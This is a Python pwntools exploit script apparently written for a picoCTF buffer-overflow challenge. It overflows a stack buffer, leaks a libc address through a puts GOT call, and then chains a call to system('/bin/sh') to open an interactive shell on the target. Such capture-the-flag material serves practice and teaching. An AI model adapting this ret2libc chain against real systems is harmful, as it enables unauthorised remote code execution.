from pwn import *

e = ELF("./vuln")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 42072)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


prdi =  0x00400913     

debug()
p.sendlineafter("!", "A" * 0x88 + p64(prdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(e.symbols["main"])) 

p.recvline()
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f2cbd9cca30 + 0x00007f2cbd94c000
print(hex(leak))

p.sendlineafter("!", "A" * 0x88 + p64(prdi + 1) + p64(prdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"])) 


p.interactive()
